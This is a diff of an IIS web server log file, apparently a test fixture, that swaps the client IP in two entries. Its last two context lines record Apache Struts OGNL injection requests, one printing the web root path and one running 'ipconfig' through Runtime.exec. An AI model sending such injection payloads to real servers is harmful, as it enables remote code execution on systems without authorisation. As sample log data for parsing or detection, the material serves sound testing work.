@@ -2,7 +2,7 @@
 #Version: 1.0
 #Date: 2018-01-01 08:09:10
 #Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
-2018-01-01 08:09:10 127.0.0.1 GET / q=100 80 - 85.181.35.98 Mozilla/5.0+(Windows+NT+6.1;+Win64;+x64;+rv:57.0)+Gecko/20100101+Firefox/57.0 - 200 0 0 123
+2018-01-01 08:09:10 127.0.0.1 GET / q=100 80 - 81.2.69.143 Mozilla/5.0+(Windows+NT+6.1;+Win64;+x64;+rv:57.0)+Gecko/20100101+Firefox/57.0 - 200 0 0 123
 #Software: Microsoft Internet Information Services 10.0
 #Version: 1.0
 #Date: 2018-01-01 09:10:11
@@ -12,6 +12,6 @@
 #Version: 1.0
 #Date: 2018-01-01 10:11:12
 #Fields: date time s-sitename s-computername s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs-version cs(User-Agent) cs(Cookie) cs(Referer) cs-host sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
-2018-01-01 10:11:12 W3SVC1 MACHINE-NAME 127.0.0.1 GET / - 80 - 85.181.35.98 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_14_0)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/70.0.3538.102+Safari/537.36 - - example.com 200 0 0 123 456 789
+2018-01-01 10:11:12 W3SVC1 MACHINE-NAME 127.0.0.1 GET / - 80 - 81.2.69.143 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_14_0)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/70.0.3538.102+Safari/537.36 - - example.com 200 0 0 123 456 789
 2018-12-31 12:52:33 10.44.0.136 GET / redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23webroot%3d%23req.getSession().getServletContext().getRealPath('/'),%23resp.println(%23webroot),%23resp.flush(),%23resp.close()} 443 - 10.50.6.188 Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+Trident/4.0) - 401 0 0 0
 2018-12-31 12:52:33 10.44.0.136 GET /${#context['xwork.MethodAccessor.denyMethodExecution']=!(#_memberAccess['allowStaticMethodAccess']=true),(@java.lang.Runtime@getRuntime()).exec('ipconfig').waitFor()}.action - 443 - 10.50.6.188 Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+Trident/4.0) - 404 0 2 0
